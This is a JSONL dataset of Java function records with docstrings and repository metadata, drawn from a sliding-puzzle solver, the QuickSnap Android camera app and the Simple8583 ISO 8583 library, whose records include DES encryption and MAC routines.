{"docstring": "/**\n * Heuristic based on the number of direct permutation between state and arrival\n * */\n", "func_signal": "public int distanceToArrival(StateCode state)", "code": "{\n\tbyte[] bstate = state.toByteArray();\n\n\tif (bstate.length>8) {\n\t\tSystem.out.println(\"PB state \"+bstate.length);\n\t\tSASolverNoBigInt.printState(state);\n\t}\n\t\n\tint differences = 0;\n\tint diff = 0;\n\tfor (int i = 0; i < bstate.length; i++) {\n\t\tdiff = m_arrival[i]-bstate[i];\n\t\tif (diff !=0) {\n\t\t\tdifferences += (0x0F & diff)!=0 ? 1 : 0; \t\t\t\t\t\n\t\t\tdifferences += (0x0F & (diff >> 4))!=0 ? 1 : 0; \n\t\t}\n\t}\t\t\t\t\t\n\treturn differences/2;\n}", "path": "SlidingPuzzle\\src\\com\\oti\\solutions\\sam\\SASolverNoBigInt.java", "repo_name": "AlgorithmsNYC/AlgorithmsNYC", "stars": 84, "license": "None", "language": "java", "size": 622}
{"docstring": "// create the first leaf corresponding to the initial state\n", "func_signal": "private FrontierLeaf buildInitialLeaf(Board board)", "code": "{\n\tFrontierLeaf res = new FrontierLeaf();  \n\tres.cost = 0;\n\tres.state= createState(board); // current board\n    res.prevAction =0; // no previous action for leading to the initial state, bit 6 true\n    res.previous=null;\t\t\n\treturn res;\n}", "path": "SlidingPuzzle\\src\\com\\oti\\solutions\\sam\\SASolverNoBigInt.java", "repo_name": "AlgorithmsNYC/AlgorithmsNYC", "stars": 84, "license": "None", "language": "java", "size": 622}
{"docstring": "/**\n * Changes the state of the board by performing the provided move.\n * The piece in the move will be moved to the move's nextLocation\n * and the blank at the next location will be moved to where the piece was moved from.\n * @param move\n * @param showChanges when true, will describe the move in output to the console\n * @throws PuzzleException if there is not a blank currently at the move's nextLocation\n */\n", "func_signal": "public void makeMove(Move move, boolean showChanges)\nthrows PuzzleException", "code": "{\n\n    // swap positions between the current piece and the blank at the next state\n    Piece pieceToMove = move.getPiece();\n    Location nextLocation = move.getNextLocation();\n    Location currentLocationForPiece = locationForPiece(pieceToMove);\n    Piece blankPiece = pieceAt(nextLocation);\n\n    if(!blankPiece.isBlank()){\n        String message = String.format(\n                \"FAILED com.oti.Move: %s from %s to %s: blank is not in destination location\\n\",\n                pieceToMove, currentLocationForPiece, nextLocation);\n        throw new PuzzleException(message);\n    }\n\n    _pieces[nextLocation.getLinearIndex()] = pieceToMove;\n    _pieces[currentLocationForPiece.getLinearIndex()] = blankPiece;\n    _locations[pieceToMove.getPieceNumber()] = nextLocation;\n    _locations[blankPiece.getPieceNumber()] = currentLocationForPiece;\n\n    if(showChanges){\n        System.out.println();\n        System.out.printf(\"\\tcom.oti.Move: %s from %s to %s\\n\", pieceToMove, currentLocationForPiece, nextLocation);\n    }\n}", "path": "SlidingPuzzle\\src\\com\\oti\\Board.java", "repo_name": "AlgorithmsNYC/AlgorithmsNYC", "stars": 84, "license": "None", "language": "java", "size": 622}
{"docstring": "/**\n * Returns true IFF the board is in a solved state\n */\n", "func_signal": "public boolean isSolved()", "code": "{\n    Set<Location> orderedLocations = Location.allKnownOrderedLocations();\n\n    int pieceNumber = 1;\n    for (Location orderedLocation : orderedLocations) {\n        Piece piece = pieceAt(orderedLocation);\n        if(piece.getPieceNumber() != pieceNumber){\n            return false;\n        }\n\n        pieceNumber = (pieceNumber + 1) % _numberOfLocations;\n    }\n\n    return true;\n}", "path": "SlidingPuzzle\\src\\com\\oti\\Board.java", "repo_name": "AlgorithmsNYC/AlgorithmsNYC", "stars": 84, "license": "None", "language": "java", "size": 622}
{"docstring": "/** build a list of Move fromt start to arrival, from the chain of Evalue*/\n", "func_signal": "private Solution buildPath(Evalue currEvalue)", "code": "{\n\t// list from end to beginning\n\tArrayList<Move> revMoves = new ArrayList<Move>();\n\t// check for departure == arrival\n\tif (currEvalue.parent!=null) {\n\t\twhile(currEvalue.parent!=null) {\t\t\t\t\n\t\t\trevMoves.add( createMove(currEvalue.parent.state, currEvalue.prevAction));\n\t\t\tcurrEvalue = currEvalue.parent;\n\t\t}\n\t}\n\t// reverse the list\n\tCollections.reverse(revMoves);\n\tSolution sol = new Solution();\n\tfor (Move move : revMoves) {\n//\t        Piece pieceToMove = move.getPiece();\n//\t        Location nextLocation = move.getNextLocation();\n//\t\t\tSystem.out.println();\n//            System.out.printf(\"\\tcom.oti.Move: %s to %s\\n\", pieceToMove, nextLocation);\n            \n\t\tsol.add( move);\n\t} \n\t\n\t\n\treturn sol;\n}", "path": "SlidingPuzzle\\src\\com\\oti\\solutions\\sam\\SASolverNoBigInt.java", "repo_name": "AlgorithmsNYC/AlgorithmsNYC", "stars": 84, "license": "None", "language": "java", "size": 622}
{"docstring": "// Snapshots can only be taken after this is called. It should be called\n// once only. We could have done these things in onCreate() but we want to\n// make preview screen appear as soon as possible.\n", "func_signal": "private void initializeFirstTime()", "code": "{\n    if (mFirstTimeInitialized) return;\n\n    // Create orientation listenter. This should be done first because it\n    // takes some time to get first orientation.\n    ((CameraApplication)getApplication()).registerOrientationChangeListener(mOrientationChangeListener);\n\n    keepMediaProviderInstance();\n    checkStorage();\n\n    // Initialize last picture button.\n    mContentResolver = getContentResolver();\n    //if (!mIsImageCaptureIntent)  {\n        mLastPictureButton =\n                (ImageView) findViewById(R.id.review_thumbnail);\n        mLastPictureButton.setOnClickListener(this);\n        mFlashButton = (RotateImageView) findViewById(R.id.btn_flash);\n        mFlashButton.setOnClickListener(this);\n        mCameraTypeButton = (RotateImageView) findViewById(R.id.btn_camera_type);\n        mCameraTypeButton.setOnClickListener(this);\n        if (CameraHolder.instance().getNumberOfCameras() > 1) {\n        \tmCameraTypeButton.setVisibility(View.VISIBLE);\n        } else {\n        \tmCameraTypeButton.setVisibility(View.GONE);\n        }\n        \n        mThumbController = new ThumbnailController(\n                getResources(), mLastPictureButton, mContentResolver);\n        //mThumbController.loadData(ImageManager.getLastImageThumbPath());\n        String lastPhotoThumbPath = getLastPhotoThumbPath();\n        if (lastPhotoThumbPath != null) {\n        \tmThumbController.loadData(lastPhotoThumbPath);\n\t\t\t}\n        // Update last image thumbnail.\n        updateThumbnailButton();\n    //}\n\n    // Initialize shutter button.\n    mShutterButton = (ShutterButton) findViewById(R.id.shutter_button);\n    mShutterButton.setOnShutterButtonListener(this);\n    mShutterButton.setVisibility(View.VISIBLE);\n\n    mFocusRectangle = (FocusRectangle) findViewById(R.id.focus_rectangle);\n    updateFocusIndicator();\n\n    initializeScreenBrightness();\n    installIntentFilter();\n    initializeFocusTone();\n    initializeZoom();\n    mHeadUpDisplay = new CameraHeadUpDisplay(this);\n    mHeadUpDisplay.setListener(new MyHeadUpDisplayListener());\n    initializeHeadUpDisplay();\n    mFirstTimeInitialized = true;\n    changeHeadUpDisplayState();\n    addIdleHandler();\n    setInitialOrientation();\n}", "path": "Camera\\src\\com\\lightbox\\android\\camera\\activities\\Camera.java", "repo_name": "lightbox/QuickSnap", "stars": 81, "license": "None", "language": "java", "size": 589}
{"docstring": "// Returns the rotation degree in the jpeg header.\n", "func_signal": "private int storeImage(byte[] data)", "code": "{\n    try {\n        long dateTaken = System.currentTimeMillis();\n        String title = createName(dateTaken);\n        String filename = title + \".jpg\";\n        int[] degree = new int[1];\n        mLastContentUri = ImageManager.addImage(\n                mContentResolver,\n                title,\n                dateTaken,\n                null, // location from gps/network\n                ImageManager.CAMERA_IMAGE_BUCKET_NAME, filename,\n                null, data,\n                degree);\n        return degree[0];\n    } catch (Exception ex) {\n        Log.e(TAG, \"Exception while compressing image.\", ex);\n        return 0;\n    }\n}", "path": "Camera\\src\\com\\lightbox\\android\\camera\\activities\\Camera.java", "repo_name": "lightbox/QuickSnap", "stars": 81, "license": "None", "language": "java", "size": 589}
{"docstring": "/**\n * Update the text in a OnScreenHint that was previously created using one\n * of the makeText() methods.\n * @param s The new text for the OnScreenHint.\n */\n", "func_signal": "public void setText(CharSequence s)", "code": "{\n    if (mNextView == null) {\n        throw new RuntimeException(\"This OnScreenHint was not \"\n                + \"created with OnScreenHint.makeText()\");\n    }\n    TextView tv = (TextView) mNextView.findViewById(R.id.message);\n    if (tv == null) {\n        throw new RuntimeException(\"This OnScreenHint was not \"\n                + \"created with OnScreenHint.makeText()\");\n    }\n    tv.setText(s);\n}", "path": "Camera\\src\\com\\lightbox\\android\\camera\\OnScreenHint.java", "repo_name": "lightbox/QuickSnap", "stars": 81, "license": "None", "language": "java", "size": 589}
{"docstring": "/**\n * Gets the bounds of the given descendant that relative to this view.\n */\n", "func_signal": "public boolean getBoundsOf(GLView descendant, Rect out)", "code": "{\n    int xoffset = 0;\n    int yoffset = 0;\n    GLView view = descendant;\n    while (view != this) {\n        if (view == null) return false;\n        Rect bounds = view.mBounds;\n        xoffset += bounds.left;\n        yoffset += bounds.top;\n        view = view.mParent;\n    }\n    out.set(xoffset, yoffset, xoffset + descendant.getWidth(),\n            yoffset + descendant.getHeight());\n    return true;\n}", "path": "Camera\\src\\com\\lightbox\\android\\camera\\ui\\GLView.java", "repo_name": "lightbox/QuickSnap", "stars": 81, "license": "None", "language": "java", "size": 589}
{"docstring": "/**\n * Stretches the texture according to the nine-patch rules. It will\n * linearly distribute the strechy parts defined in the nine-patch chunk to\n * the target area.\n *\n * <pre>\n *                      source\n *          /--------------^---------------\\\n *         u0    u1       u2  u3     u4   u5\n * div ---> |fffff|ssssssss|fff|ssssss|ffff| ---> u\n *          |    div0    div1 div2   div3  |\n *          |     |       /   /      /    /\n *          |     |      /   /     /    /\n *          |     |     /   /    /    /\n *          |fffff|ssss|fff|sss|ffff| ---> x\n *         x0    x1   x2  x3  x4   x5\n *          \\----------v------------/\n *                  target\n *\n * f: fixed segment\n * s: stretchy segment\n * </pre>\n *\n * @param div the stretch parts defined in nine-patch chunk\n * @param source the length of the texture\n * @param target the length on the drawing plan\n * @param u output, the positions of these dividers in the texture\n *        coordinate\n * @param x output, the corresponding position of these dividers on the\n *        drawing plan\n * @return the number of these dividers.\n */\n", "func_signal": "private int stretch(\n        int x[], float u[], int div[], int source, int target)", "code": "{\n    int textureSize = Util.nextPowerOf2(source);\n    float textureBound = (source - 0.5f) / textureSize;\n\n    int stretch = 0;\n    for (int i = 0, n = div.length; i < n; i += 2) {\n        stretch += div[i + 1] - div[i];\n    }\n\n    float remaining = target - source + stretch;\n\n    int lastX = 0;\n    int lastU = 0;\n\n    x[0] = 0;\n    u[0] = 0;\n    for (int i = 0, n = div.length; i < n; i += 2) {\n        // fixed segment\n        x[i + 1] = lastX + (div[i] - lastU);\n        u[i + 1] = Math.min((float) div[i] / textureSize, textureBound);\n\n        // stretchy segment\n        float partU = div[i + 1] - div[i];\n        int partX = (int)(remaining * partU / stretch + 0.5f);\n        remaining -= partX;\n        stretch -= partU;\n\n        lastX = x[i + 1] + partX;\n        lastU = div[i + 1];\n        x[i + 2] = lastX;\n        u[i + 2] = Math.min((float) lastU / textureSize, textureBound);\n    }\n    // the last fixed segment\n    x[div.length + 1] = target;\n    u[div.length + 1] = textureBound;\n\n    // remove segments with length 0.\n    int last = 0;\n    for (int i = 1, n = div.length + 2; i < n; ++i) {\n        if (x[last] == x[i]) continue;\n        x[++last] = x[i];\n        u[last] = u[i];\n    }\n    return last + 1;\n}", "path": "Camera\\src\\com\\lightbox\\android\\camera\\ui\\GLRootView.java", "repo_name": "lightbox/QuickSnap", "stars": 81, "license": "None", "language": "java", "size": 589}
{"docstring": "// mSkipCounts is used to tally the counts as we traverse\n// the mSkipList.  It's a member variable only so that\n// we don't have to allocate each time through.  Otherwise\n// it could just as easily be a local.\n", "func_signal": "public IImage getImageAt(int index)", "code": "{\n    if (index < 0 || index > getCount()) {\n        throw new IndexOutOfBoundsException(\n                \"index \" + index + \" out of range max is \" + getCount());\n    }\n\n    int skipCounts[] = mSkipCounts;\n    // zero out the mSkipCounts since that's only used for the\n    // duration of the function call.\n    Arrays.fill(skipCounts, 0);\n\n    // a counter of how many images we've skipped in\n    // trying to get to index.  alternatively we could\n    // have decremented index but, alas, I liked this\n    // way more.\n    int skipCount = 0;\n\n    // scan the existing mSkipList to see if we've computed\n    // enough to just return the answer\n    for (int i = 0, n = mSkipListSize; i < n; ++i) {\n        long v = mSkipList[i];\n\n        int offset = (int) (v & 0xFFFFFFFF);\n        int which  = (int) (v >> 32);\n        if (skipCount + offset > index) {\n            int subindex = mSkipCounts[which] + (index - skipCount);\n            return mSubList[which].getImageAt(subindex);\n        }\n        skipCount += offset;\n        mSkipCounts[which] += offset;\n    }\n\n    for (; true; ++skipCount) {\n        MergeSlot slot = nextMergeSlot();\n        if (slot == null) return null;\n        if (skipCount == index) {\n            IImage result = slot.mImage;\n            if (slot.next()) mQueue.add(slot);\n            return result;\n        }\n        if (slot.next()) mQueue.add(slot);\n    }\n}", "path": "Camera\\src\\com\\lightbox\\android\\camera\\gallery\\ImageListUber.java", "repo_name": "lightbox/QuickSnap", "stars": 81, "license": "None", "language": "java", "size": 589}
{"docstring": "// If the activity is paused and resumed, this method will be called in\n// onResume.\n", "func_signal": "private void initializeSecondTime()", "code": "{\n\t// Create orientation listenter. This should be done first because it\n    // takes some time to get first orientation.\n    ((CameraApplication)getApplication()).registerOrientationChangeListener(mOrientationChangeListener);\n    \n    installIntentFilter();\n    initializeFocusTone();\n    initializeZoom();\n    changeHeadUpDisplayState();\n\n    keepMediaProviderInstance();\n    checkStorage();\n\n    if (!mIsImageCaptureIntent) {\n        updateThumbnailButton();\n    }\n}", "path": "Camera\\src\\com\\lightbox\\android\\camera\\activities\\Camera.java", "repo_name": "lightbox/QuickSnap", "stars": 81, "license": "None", "language": "java", "size": 589}
{"docstring": "/**\n * Make a standard hint that just contains a text view.\n *\n * @param context  The context to use.  Usually your\n *                 {@link android.app.Application} or\n *                 {@link android.app.Activity} object.\n * @param text     The text to show.  Can be formatted text.\n *\n */\n", "func_signal": "public static OnScreenHint makeText(Context context, CharSequence text)", "code": "{\n    OnScreenHint result = new OnScreenHint(context);\n\n    LayoutInflater inflate =\n            (LayoutInflater) context.getSystemService(\n            Context.LAYOUT_INFLATER_SERVICE);\n    View v = inflate.inflate(R.layout.on_screen_hint, null);\n    TextView tv = (TextView) v.findViewById(R.id.message);\n    tv.setText(text);\n\n    result.mNextView = v;\n\n    return result;\n}", "path": "Camera\\src\\com\\lightbox\\android\\camera\\OnScreenHint.java", "repo_name": "lightbox/QuickSnap", "stars": 81, "license": "None", "language": "java", "size": 589}
{"docstring": "// This provides a default sorting order string for subclasses.\n// The list is first sorted by date, then by id. The order can be ascending\n// or descending, depending on the mSort variable.\n// The date is obtained from the \"datetaken\" column. But if it is null,\n// the \"date_modified\" column is used instead.\n", "func_signal": "protected String sortOrder()", "code": "{\n    String ascending =\n            (mSort == ImageManager.SORT_ASCENDING)\n            ? \" ASC\"\n            : \" DESC\";\n\n    // Use DATE_TAKEN if it's non-null, otherwise use DATE_MODIFIED.\n    // DATE_TAKEN is in milliseconds, but DATE_MODIFIED is in seconds.\n    String dateExpr =\n            \"case ifnull(datetaken,0)\" +\n            \" when 0 then date_modified*1000\" +\n            \" else datetaken\" +\n            \" end\";\n\n    // Add id to the end so that we don't ever get random sorting\n    // which could happen, I suppose, if the date values are the same.\n    return dateExpr + ascending + \", _id\" + ascending;\n}", "path": "Camera\\src\\com\\lightbox\\android\\camera\\gallery\\BaseImageList.java", "repo_name": "lightbox/QuickSnap", "stars": 81, "license": "None", "language": "java", "size": 589}
{"docstring": "/*private void hidePostCaptureAlert() {\n    if (mIsImageCaptureIntent) {\n        findViewById(R.id.shutter_button).setVisibility(View.VISIBLE);\n        int[] pickIds = {R.id.btn_retake, R.id.btn_done};\n        for (int id : pickIds) {\n            View button = findViewById(id);\n            ((View) button.getParent()).setVisibility(View.GONE);\n        }\n    }\n}*/\n", "func_signal": "private int calculatePicturesRemaining()", "code": "{\n    mPicturesRemaining = MenuHelper.calculatePicturesRemaining();\n    return mPicturesRemaining;\n}", "path": "Camera\\src\\com\\lightbox\\android\\camera\\activities\\Camera.java", "repo_name": "lightbox/QuickSnap", "stars": 81, "license": "None", "language": "java", "size": 589}
{"docstring": "/**\n * Construct an empty OnScreenHint object.  You must call {@link #setView}\n * before you can call {@link #show}.\n *\n * @param context  The context to use.  Usually your\n *                 {@link android.app.Application} or\n *                 {@link android.app.Activity} object.\n */\n", "func_signal": "public OnScreenHint(Context context)", "code": "{\n    mWM = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);\n    mY = context.getResources().getDimensionPixelSize(\n            R.dimen.hint_y_offset);\n\n    mParams.height = WindowManager.LayoutParams.WRAP_CONTENT;\n    mParams.width = WindowManager.LayoutParams.WRAP_CONTENT;\n    mParams.flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE\n            | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE;\n    mParams.format = PixelFormat.TRANSLUCENT;\n    mParams.windowAnimations = R.style.Animation_OnScreenHint;\n    mParams.type = WindowManager.LayoutParams.TYPE_APPLICATION_PANEL;\n    mParams.setTitle(\"OnScreenHint\");\n}", "path": "Camera\\src\\com\\lightbox\\android\\camera\\OnScreenHint.java", "repo_name": "lightbox/QuickSnap", "stars": 81, "license": "None", "language": "java", "size": 589}
{"docstring": "// Retrieve and return the Jpeg encoding quality number\n// for the given quality level.\n", "func_signal": "public static int getQualityNumber(String jpegQuality)", "code": "{\n    Integer quality = mHashMap.get(jpegQuality);\n    if (quality == null) {\n        Log.w(TAG, \"Unknown Jpeg quality: \" + jpegQuality);\n        return DEFAULT_QUALITY;\n    }\n    if (Build.VERSION.SDK_INT >= 0x00000008) {\n    \treturn CameraProfile.getJpegEncodingQualityParameter(quality.intValue());\n    } else {\n    \t// Find the index of the input string\n        int index = Util.indexOf(mQualityStrings, jpegQuality);\n\n        if (index == -1 || index > mQualityNumbers.length - 1) {\n            return DEFAULT_QUALITY;\n        }\n\n        try {\n            return mQualityNumbers[index];\n        } catch (NumberFormatException ex) {\n            return DEFAULT_QUALITY;\n        }\n    }\n}", "path": "Camera\\src\\com\\lightbox\\android\\camera\\activities\\Camera.java", "repo_name": "lightbox/QuickSnap", "stars": 81, "license": "None", "language": "java", "size": 589}
{"docstring": "/**\n * Show the view on the screen.\n */\n", "func_signal": "public void show()", "code": "{\n    if (mNextView == null) {\n        throw new RuntimeException(\"setView must have been called\");\n    }\n    mHandler.post(mShow);\n}", "path": "Camera\\src\\com\\lightbox\\android\\camera\\OnScreenHint.java", "repo_name": "lightbox/QuickSnap", "stars": 81, "license": "None", "language": "java", "size": 589}
{"docstring": "/**\n * Constructor.\n *\n * @param id        the image id of the image\n * @param cr        the content resolver\n */\n", "func_signal": "protected VideoObject(ContentResolver cr,\n        long id, Uri uri, long miniThumbMagic,\n        long dateTaken)", "code": "{\n    super(cr, id, uri, miniThumbMagic,\n            dateTaken);\n}", "path": "Camera\\src\\com\\lightbox\\android\\camera\\gallery\\VideoObject.java", "repo_name": "lightbox/QuickSnap", "stars": 81, "license": "None", "language": "java", "size": 589}
{"docstring": "/**\n * Called when the context is created, possibly after automatic destruction.\n */\n// This is a GLSurfaceView.Renderer callback\n", "func_signal": "public void onSurfaceCreated(GL10 gl1, EGLConfig config)", "code": "{\n    GL11 gl = (GL11) gl1;\n    if (mGL != null) {\n        // The GL Object has changed\n        Log.i(TAG, \"GLObject has changed from \" + mGL + \" to \" + gl);\n    }\n    mGL = gl;\n\n    if (!ENABLE_FPS_TEST) {\n        setRenderMode(GLSurfaceView.RENDERMODE_WHEN_DIRTY);\n    } else {\n        setRenderMode(GLSurfaceView.RENDERMODE_CONTINUOUSLY);\n    }\n\n    // Disable unused state\n    gl.glDisable(GL11.GL_LIGHTING);\n\n    // Enable used features\n    gl.glEnable(GL11.GL_BLEND);\n    gl.glEnable(GL11.GL_SCISSOR_TEST);\n    gl.glEnable(GL11.GL_STENCIL_TEST);\n    gl.glEnableClientState(GL10.GL_VERTEX_ARRAY);\n    gl.glEnableClientState(GL10.GL_TEXTURE_COORD_ARRAY);\n    gl.glEnable(GL11.GL_TEXTURE_2D);\n    mTexture2DEnabled = true;\n\n    gl.glTexEnvf(GL11.GL_TEXTURE_ENV,\n            GL11.GL_TEXTURE_ENV_MODE, GL11.GL_REPLACE);\n\n    // Set the background color\n    gl.glClearColor(0f, 0f, 0f, 0f);\n    gl.glClearStencil(0);\n\n    gl.glVertexPointer(2, GL11.GL_FLOAT, 0, mXyPointer);\n    gl.glTexCoordPointer(2, GL11.GL_FLOAT, 0, mUvPointer);\n\n}", "path": "Camera\\src\\com\\lightbox\\android\\camera\\ui\\GLRootView.java", "repo_name": "lightbox/QuickSnap", "stars": 81, "license": "None", "language": "java", "size": 589}
{"docstring": "/**\n * Initiate the capture of an image.\n */\n", "func_signal": "public void initiate()", "code": "{\n    if (mCameraDevice == null) {\n        return;\n    }\n\n\tmDoAnimation = true;\n    mCameraDevice.setOneShotPreviewCallback(mPreviewFrameCallback);\n}", "path": "Camera\\src\\com\\lightbox\\android\\camera\\activities\\Camera.java", "repo_name": "lightbox/QuickSnap", "stars": 81, "license": "None", "language": "java", "size": 589}
{"docstring": "// TODO: Change public to protected\n", "func_signal": "public Uri contentUri(long id)", "code": "{\n    // TODO: avoid using exception for most cases\n    try {\n        // does our uri already have an id (single image query)?\n        // if so just return it\n        long existingId = ContentUris.parseId(mBaseUri);\n        if (existingId != id) Log.e(TAG, \"id mismatch\");\n        return mBaseUri;\n    } catch (NumberFormatException ex) {\n        // otherwise tack on the id\n        return ContentUris.withAppendedId(mBaseUri, id);\n    }\n}", "path": "Camera\\src\\com\\lightbox\\android\\camera\\gallery\\BaseImageList.java", "repo_name": "lightbox/QuickSnap", "stars": 81, "license": "None", "language": "java", "size": 589}
{"docstring": "// If the Camera is idle, update the parameters immediately, otherwise\n// accumulate them in mUpdateSet and update later.\n", "func_signal": "private void setCameraParametersWhenIdle(int additionalUpdateSet)", "code": "{\n    mUpdateSet |= additionalUpdateSet;\n    if (mCameraDevice == null) {\n        // We will update all the parameters when we open the device, so\n        // we don't need to do anything now.\n        mUpdateSet = 0;\n        return;\n    } else if (isCameraIdle()) {\n        setCameraParameters(mUpdateSet);\n        mUpdateSet = 0;\n    } else {\n        if (!mHandler.hasMessages(SET_CAMERA_PARAMETERS_WHEN_IDLE)) {\n            mHandler.sendEmptyMessageDelayed(\n                    SET_CAMERA_PARAMETERS_WHEN_IDLE, 1000);\n        }\n    }\n}", "path": "Camera\\src\\com\\lightbox\\android\\camera\\activities\\Camera.java", "repo_name": "lightbox/QuickSnap", "stars": 81, "license": "None", "language": "java", "size": 589}
{"docstring": "// We separate the parameters into several subsets, so we can update only\n// the subsets actually need updating. The PREFERENCE set needs extra\n// locking because the preference can be changed from GLThread as well.\n", "func_signal": "private void setCameraParameters(int updateSet)", "code": "{\n    mParameters = mCameraDevice.getParameters();\n\n    if ((updateSet & UPDATE_PARAM_INITIALIZE) != 0) {\n        updateCameraParametersInitialize();\n    }\n\n    if ((updateSet & UPDATE_PARAM_ZOOM) != 0) {\n        updateCameraParametersZoom();\n    }\n\n    if ((updateSet & UPDATE_PARAM_PREFERENCE) != 0) {\n        updateCameraParametersPreference();\n    }\n\n\tParameters oldParameters = mCameraDevice.getParameters();\n    try {\n    \tmCameraDevice.setParameters(mParameters);\n    } catch (IllegalArgumentException e) {\n    \tmCameraDevice.setParameters(oldParameters);\n    \tmParameters = oldParameters;\n    \tmZoomValue = 0;\n    \tLog.w(TAG, e);\n    }\n    initControlButtons();\n}", "path": "Camera\\src\\com\\lightbox\\android\\camera\\activities\\Camera.java", "repo_name": "lightbox/QuickSnap", "stars": 81, "license": "None", "language": "java", "size": 589}
{"docstring": "/**\n * Called when the OpenGL surface is recreated without destroying the\n * context.\n */\n// This is a GLSurfaceView.Renderer callback\n", "func_signal": "public void onSurfaceChanged(GL10 gl1, int width, int height)", "code": "{\n    Log.v(TAG, \"onSurfaceChanged: \" + width + \"x\" + height\n            + \", gl10: \" + gl1.toString());\n    GL11 gl = (GL11) gl1;\n    mGL = gl;\n    gl.glViewport(0, 0, width, height);\n\n    gl.glMatrixMode(GL11.GL_PROJECTION);\n    gl.glLoadIdentity();\n\n    GLU.gluOrtho2D(gl, 0, width, 0, height);\n    Matrix matrix = mTransformation.getMatrix();\n    matrix.reset();\n    matrix.preTranslate(0, getHeight());\n    matrix.preScale(1, -1);\n}", "path": "Camera\\src\\com\\lightbox\\android\\camera\\ui\\GLRootView.java", "repo_name": "lightbox/QuickSnap", "stars": 81, "license": "None", "language": "java", "size": 589}
{"docstring": "// \u7f16\u7801\u89c4\u5219\n// 2 Primary Account Number\n// 3 Processing Code\n// 4 Amount, Transaction\n// 11 System Trace Audit Number\n// 12 Time, Local Transaction\n// 13 Date, Local Transaction\n// 49 Currency Code, Transaction\n// 38 Authorization Identification Response\n// 39 Response Code\n// 41 Card Acceptor Terminal Identification\n", "func_signal": "@Override\nprotected byte[] mac(IsoPackage isoPackage) throws Exception", "code": "{\n\tString[] md5Array = { \"2\", \"3\", \"4\", \"11\", \"12\", \"13\", \"49\", \"38\",\n\t\t\t\"39\", \"41\" };\n\tStringBuffer accum = new StringBuffer();\n\tfor (String key : md5Array) {\n\t\tIsoField field = isoPackage.getIsoField(key);\n\t\tif (field == null) {\n\t\t\tcontinue;\n\t\t}\n\t\tif (field.getValue() == null) {\n\t\t\tcontinue;\n\t\t}\n\t\tif (field.getId().equals(\"49\")) {\n\t\t\taccum.append(field.getValue().substring(1));\n\t\t} else {\n\t\t\taccum.append(field.getValue());\n\t\t}\n\t}\n\tString original = accum.toString();\n\tString val = TripleDES.getMac(macKey, original);\n\treturn EncodeUtil.bcd(val);\n}", "path": "com\\simple8583\\factory\\IsoMsgFactory.java", "repo_name": "magicjoey/Simple8583", "stars": 65, "license": "None", "language": "java", "size": 229}
{"docstring": "/**\n * \n * \u5c06int\u8f6c\u6362\u6210Hex\n * \n * @param i\n * \n * @return\n * \n * @throws Exception\n */\n", "func_signal": "protected static  String int2Hex(int i)", "code": "{\n\tswitch (i) {\n\tcase 0:\n\tcase 1:\n\tcase 2:\n\tcase 3:\n\tcase 4:\n\tcase 5:\n\tcase 6:\n\tcase 7:\n\tcase 8:\n\tcase 9:\n\t\treturn \"\" + i;\n\tcase 10:\n\t\treturn \"A\";\n\tcase 11:\n\t\treturn \"B\";\n\tcase 12:\n\t\treturn \"C\";\n\tcase 13:\n\t\treturn \"D\";\n\tcase 14:\n\t\treturn \"E\";\n\tcase 15:\n\t\treturn \"F\";\n\tdefault:\n\t\treturn null;\n\t}\n}", "path": "com\\simple8583\\util\\encrypt\\DES.java", "repo_name": "magicjoey/Simple8583", "stars": 65, "license": "None", "language": "java", "size": 229}
{"docstring": "/**\n * \n * \u83b7\u53d6\u8f6e\u5b50\u5bc6\u94a5(48bit)\n * \n * @param source\n * \n * @return\n */\n", "func_signal": "protected static  void setKey(String source)", "code": "{\n\tif (subKey.length > 0)\n\t\tsubKey = new int[16][48];\n\t// \u88c5\u6362\ufffd?4bit\n\tint[] temp = string2Binary(source);\n\t// \ufffd?6bit\u5747\u5206\u6210\u4e24\u90e8\u5206\n\tint[] left = new int[28];\n\tint[] right = new int[28];\n\t// \u7ecf\u8fc7PC-1\ufffd?4bit\u8f6c\u6362\ufffd?6bit\n\tint[] temp1 = new int[56];\n\ttemp1 = keyPC_1(temp);\n\t// printArr(temp1);\n\t// \u5c06\u7ecf\u8fc7\u8f6c\u6362\u7684temp1\u5747\u5206\u6210\u4e24\u90e8\u5206\n\tfor (int i = 0; i < 28; i++) {\n\t\tleft[i] = temp1[i];\n\t\tright[i] = temp1[i + 28];\n\t}\n\n\t// \u7ecf\u8fc716\u6b21\u5faa\u73af\u5de6\u79fb\uff0c\u7136\u540ePC-2\u7f6e\u6362\n\tfor (int i = 0; i < 16; i++) {\n\t\tleft = keyLeftMove(left, LS[i]);\n\t\tright = keyLeftMove(right, LS[i]);\n\t\tfor (int j = 0; j < 28; j++) {\n\t\t\ttemp1[j] = left[j];\n\t\t\ttemp1[j + 28] = right[j];\n\t\t}\n\t\t// printArr(temp1);\n\t\tsubKey[i] = keyPC_2(temp1);\n\t}\n}", "path": "com\\simple8583\\util\\encrypt\\DES.java", "repo_name": "magicjoey/Simple8583", "stars": 65, "license": "None", "language": "java", "size": 229}
{"docstring": "/**\n * \n * \u4e3b\u5bc6\u94a5\u9700\u8981\u7ecf\u8fc7\u4e24\u6b21\u5206\u6563\u83b7\u5f97IC\u5361\u4e2d\u7684\u5b50\u5bc6\u94a5\n * \n * @param issuerFlag\u53d1\u5361\u65b9\u6807\u8bc6\u7b26\n * \n * @param appNo\u5e94\u7528\u5e8f\u5217\u53f7\u5373\u5361\u53f7\n * \n * @param mpk\u4e3b\u5bc6\u94a5\n * \n * @return\n */\n", "func_signal": "protected static  String getDPK(String issuerFlag, String appNo, String mpk)", "code": "{\n\t// \u7b2c\u4e00\u6b21\u5206\u6563\n\tStringBuffer issuerMPK = new StringBuffer();\n\t// \u83b7\u53d6Issuer MPK\u5de6\u534a\u8fb9\n\tissuerMPK.append(divData(issuerFlag, mpk, 0));\n\t// \u83b7\u53d6Issuer MPK\u53f3\u534a\u8fb9\n\tissuerMPK.append(divData(reverse(issuerFlag), mpk, 0));\n\t// \u7b2c\u4e8c\u6b21\u5206\u6563\n\tStringBuffer dpk = new StringBuffer();\n\t// \u83b7\u53d6DPK\u5de6\u534a\u8fb9\n\tdpk.append(divData(appNo, issuerMPK.toString(), 0));\n\t// \u83b7\u53d6DPK\u53f3\u534a\u8fb9\n\tdpk.append(divData(reverse(appNo), issuerMPK.toString(), 0));\n\treturn dpk.toString();\n}", "path": "com\\simple8583\\util\\encrypt\\DES.java", "repo_name": "magicjoey/Simple8583", "stars": 65, "license": "None", "language": "java", "size": 229}
